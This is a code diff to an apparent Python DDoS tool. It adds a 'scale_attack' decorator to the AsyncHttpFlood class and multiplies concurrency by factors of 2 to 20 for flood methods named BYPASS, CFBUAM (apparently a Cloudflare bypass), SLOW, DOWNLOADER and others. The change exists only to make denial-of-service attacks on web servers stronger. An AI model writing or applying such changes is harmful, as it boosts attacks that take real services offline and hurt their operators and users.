@@ -28,6 +28,7 @@ from PyRoxy import Proxy, Tools as ProxyTools
 from .ImpactPacket import IP, TCP, UDP, Data
 from .core import cl, logger, ROOT_DIR, Stats
 
+from .concurrency import scale_attack
 from .referers import REFERERS
 from .useragents import USERAGENTS
 from .rotate import suffix as rotate_suffix, params as rotate_params
@@ -1034,6 +1035,7 @@ class AsyncHttpFlood(HttpFlood):
 
     # XXX: with async we have an option to track open connections/requests in flight
     # XXX: timeout for each request
+    @scale_attack(factor=3)
     async def BYPASS(self) -> int:
         connector = self._proxies.pick_random_connector() if self._proxies else None
         packets_sent = 0
@@ -1047,6 +1049,7 @@ class AsyncHttpFlood(HttpFlood):
                     packets_sent += 1
         return packets_sent
     
+    @scale_attack(factor=2)
     async def CFBUAM(self) -> int:
         payload: bytes = self.generate_payload()
         packets_sent, packet_size = 0, len(payload)
@@ -1069,6 +1072,7 @@ class AsyncHttpFlood(HttpFlood):
             await asyncio.wait_for(writer.wait_closed(), timeout=1)
         return packets_sent
 
+    @scale_attack(factor=5)
     async def EVEN(self) -> int:
         payload: bytes = self.generate_payload()
         packets_sent, packet_size = 0, len(payload)
@@ -1089,6 +1093,7 @@ class AsyncHttpFlood(HttpFlood):
         payload: bytes = self.generate_payload()
         return await self._generic_flood(payload, rpc=min(self._rpc, 5))
     
+    @scale_attack(factor=5)
     async def AVB(self) -> int:
         payload: bytes = self.generate_payload()
         packets_sent, packet_size = 0, len(payload)
@@ -1105,7 +1110,7 @@ class AsyncHttpFlood(HttpFlood):
             await asyncio.wait_for(writer.wait_closed(), timeout=1)
         return packets_sent
 
-    # XXX: make sure writer is closed on exception
+    @scale_attack(factor=20)
     async def SLOW(self) -> int:
         payload: bytes = self.generate_payload()
         packets_sent, packet_size = 0, len(payload)
@@ -1134,6 +1139,7 @@ class AsyncHttpFlood(HttpFlood):
         return packets_sent
 
     # XXX: with default buffering setting this methods is gonna suck :(
+    @scale_attack(factor=20)
     async def DOWNLOADER(self) -> int:
         payload: bytes = self.generate_payload()
         packets_sent, packet_size = 0, len(payload)
